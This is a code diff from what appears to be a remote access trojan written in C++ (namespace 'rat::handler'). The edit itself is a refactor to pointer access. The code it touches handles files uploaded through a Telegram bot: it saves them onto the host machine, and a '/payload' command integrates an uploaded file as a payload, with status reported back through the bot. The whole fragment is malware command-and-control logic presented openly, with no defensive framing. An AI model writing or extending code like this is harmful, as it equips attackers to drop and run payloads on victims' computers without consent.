@@ -11,13 +11,13 @@
 namespace rat::handler {
 
 void Handler::handleMessageWithUploadedFiles() {
-    if (telegram_update.message.files.empty()) return;
-    if( this->telegram_update.message.caption == "/payload"  &&  this->telegram_update.message.files.size() == 1 ){
+    if (this->telegram_update->message.files.empty()) return;
+    if( this->telegram_update->message.caption == "/payload"  &&  this->telegram_update->message.files.size() == 1 ){
         this->handlePayloadCommand();
         return;
     }
     std::ostringstream response_buffer;
-    for (const auto& file : telegram_update.message.files) {
+    for (const auto& file : this->telegram_update->message.files) {
         std::filesystem::path file_path = std::filesystem::current_path();
 
         if (file.name.has_value() && !file.name->empty()) {
@@ -33,19 +33,19 @@ void Handler::handleMessageWithUploadedFiles() {
         }
     }
 
-    response_buffer << fmt::format("Received {} uploaded file(s)", telegram_update.message.files.size());
+    response_buffer << fmt::format("Received {} uploaded file(s)", this->telegram_update->message.files.size());
     this->bot->sendMessage(response_buffer.str());
 }
 
 void Handler::handlePayloadCommand() {
     this->bot->sendMessage("Integrating the payload...");
 
-    if (this->telegram_update.message.files.empty()) {
+    if (this->telegram_update->message.files.empty()) {
         this->bot->sendMessage("No file found in the update.");
         return;
     }
 
-    const auto& file = this->telegram_update.message.files[0];
+    const auto& file = this->telegram_update->message.files[0];
     const auto& file_id = file.id;
 
     std::filesystem::path file_path = std::filesystem::current_path();
